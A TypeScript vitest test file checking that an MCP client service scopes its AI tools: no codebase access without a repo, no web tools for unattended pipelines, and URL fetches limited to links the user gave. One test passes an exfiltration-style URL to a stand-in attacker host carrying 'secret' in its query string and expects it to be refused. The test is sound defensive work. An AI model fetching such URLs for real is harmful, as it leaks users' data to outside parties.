/* eslint-disable @typescript-eslint/no-explicit-any */
import { beforeAll, describe, expect, it, vi } from "vitest";

const scrape = vi.hoisted(() => vi.fn());
vi.mock("../webScraperService", () => ({ webScraperService: { scrapeUrl: scrape } }));

import { mcpClientService } from "../mcpClientService";

beforeAll(() => {
  // Pretend the GitNexus MCP server is connected; no tool is called on it here.
  (mcpClientService as any).client = {};
  mcpClientService.isAvailable = true;
});

const names = (tools: object | undefined) => Object.keys(tools ?? {}).sort();

describe("getAiTools scoping", () => {
  it("gives no codebase tools without a repo, so no other customer's code", () => {
    expect(names(mcpClientService.getAiTools(undefined, "ws1"))).not.toContain("query_codebase");
    expect(names(mcpClientService.getAiTools("my-repo", "ws1"))).toContain("query_codebase");
  });

  it("drops the web tools for unattended pipelines", () => {
    const tools = names(mcpClientService.getAiTools("r", "ws1", { web: false }));
    expect(tools).not.toContain("fetch_url");
    expect(tools).not.toContain("search_web");
  });

  it("only fetches links the user gave", async () => {
    scrape.mockResolvedValue({ title: "T", content: "page" });
    const tools = mcpClientService.getAiTools(undefined, "ws1", {
      allowedUrls: new Set(["https://docs.example.com/guide"]),
    }) as any;

    const refused = await tools.fetch_url.execute({ url: "https://evil.example/?d=secret" }, {});
    const allowed = await tools.fetch_url.execute({ url: "https://docs.example.com/guide" }, {});

    expect(refused).toMatch(/only open links/);
    expect(allowed).toContain("page");
    expect(scrape).toHaveBeenCalledTimes(1);
  });
});
